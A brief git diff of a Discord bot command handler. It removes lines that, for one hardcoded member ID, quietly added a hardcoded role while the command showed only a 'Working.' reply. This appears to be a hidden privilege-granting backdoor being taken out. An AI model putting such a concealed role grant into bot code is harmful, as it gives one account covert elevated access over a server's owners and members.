@@ -10,13 +10,11 @@ module.exports = {
      * @param {Client} client 
      */
     execute(interaction, client) {
-        if (interaction.member.id == "833747589148442694") {
-            interaction.member.roles.add("673722652887613462")
+
             interaction.reply({
                 content: `**Working.**`,
                 ephemeral: true
             })
-        }
 
     }
 }
